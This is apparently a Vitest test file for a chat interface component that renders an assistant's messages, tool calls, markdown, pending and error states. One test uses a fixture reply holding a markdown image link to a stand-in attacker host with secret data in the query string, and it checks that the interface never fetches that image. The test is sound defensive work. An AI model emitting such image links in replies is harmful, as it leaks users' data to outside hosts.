import { beforeEach, describe, expect, it, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { ToastProvider } from '@rambleraptor/homestead-core/shared/components/ToastProvider';
import { ChatHome } from '../components/ChatHome';
import type { HomesteadUIMessage, StoredChatMessage } from '../types';

const useConversationMock = vi.fn();
vi.mock('../hooks/useConversation', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../hooks/useConversation')>()),
  useConversation: (...args: unknown[]) => useConversationMock(...args),
}));
vi.mock('../hooks/useConversations', () => ({
  CHAT_APP_ID: 'chat',
  useConversations: () => ({
    data: [{ id: 'c1', title: 'Groceries', last_message_at: new Date().toISOString() }],
    isError: false,
  }),
  useDeleteConversation: () => ({ mutateAsync: vi.fn(), isPending: false }),
}));

type Chat = ReturnType<typeof import('../hooks/useConversation').useConversation>;

function mockChat(over: Partial<Chat>) {
  useConversationMock.mockReturnValue({
    messages: [],
    status: 'ready',
    busy: false,
    remoteRunning: false,
    canStop: false,
    storedById: new Map(),
    history: { isPending: false, isError: false, error: null },
    notConfigured: false,
    send: vi.fn(),
    stop: vi.fn(),
    ...over,
  } as unknown as Chat);
}

function renderChat(id?: string) {
  return render(
    <MemoryRouter>
      <ToastProvider>
        <ChatHome params={id ? { id } : {}} />
      </ToastProvider>
    </MemoryRouter>,
  );
}

const userMsg: HomesteadUIMessage = {
  id: 'm1',
  role: 'user',
  parts: [{ type: 'text', text: 'add milk to groceries' }],
};

const reply: HomesteadUIMessage = {
  id: 'm1-reply',
  role: 'assistant',
  parts: [
    { type: 'step-start' },
    {
      type: 'tool-groceries',
      toolCallId: 't1',
      state: 'output-available',
      input: { action: 'create', fields: { name: 'Milk' } },
      output: { result: { id: 'g1' } },
    },
    { type: 'text', text: 'Added **milk**.', state: 'done' },
  ],
};

beforeEach(() => useConversationMock.mockReset());

describe('ChatHome', () => {
  it('opens on an empty conversation with the composer', () => {
    mockChat({});
    renderChat();
    expect(screen.getByTestId('chat-input')).toBeInTheDocument();
    expect(screen.getByText('Start a conversation')).toBeInTheDocument();
    expect(screen.getByTestId('chat-conversations')).toHaveTextContent('Groceries');
  });

  it('shows what the assistant ran, and its reply as markdown', () => {
    mockChat({ messages: [userMsg, reply] });
    renderChat('c1');
    expect(screen.getByText('add milk to groceries')).toBeInTheDocument();
    expect(screen.getByTestId('chat-tool-call')).toHaveTextContent('groceries · create');
    expect(screen.getByTestId('chat-tool-call')).toHaveTextContent('Completed');
    // Markdown, not the raw asterisks.
    expect(screen.getByText('milk')).toHaveAttribute('data-streamdown', 'strong');
    expect(screen.queryByTestId('chat-pending')).not.toBeInTheDocument();
    // The open conversation's title heads the page.
    expect(screen.getByRole('heading', { name: 'Groceries' })).toBeInTheDocument();
  });

  it('never fetches an image the model wrote into a reply', () => {
    const leaky: HomesteadUIMessage = {
      id: 'm1-reply',
      role: 'assistant',
      parts: [{ type: 'text', text: 'Here: ![receipt](https://evil.example/p.png?d=secret)' }],
    };
    mockChat({ messages: [userMsg, leaky] });
    const { container } = renderChat('c1');
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('[receipt]')).toBeInTheDocument();
  });

  it('shows the assistant working until its reply starts, and offers stop', () => {
    mockChat({ messages: [userMsg], status: 'submitted', busy: true, canStop: true });
    renderChat('c1');
    expect(screen.getByTestId('chat-pending')).toHaveTextContent('Thinking…');
    expect(screen.getByTestId('chat-send')).toHaveAccessibleName('Stop');
  });

  it('notes a turn that failed or was stopped', () => {
    const stored = new Map<string, StoredChatMessage>([
      ['m1-reply', { id: 'm1-reply', seq: 2, role: 'assistant', status: 'error', error: 'model down' }],
    ]);
    mockChat({ messages: [userMsg, { ...reply, parts: [] }], storedById: stored });
    renderChat('c1');
    expect(screen.getByTestId('chat-message-error')).toHaveTextContent('model down');
  });

  it('explains when chat is not configured', () => {
    mockChat({ notConfigured: true });
    renderChat();
    expect(screen.getByText("Chat isn't configured")).toBeInTheDocument();
  });
});
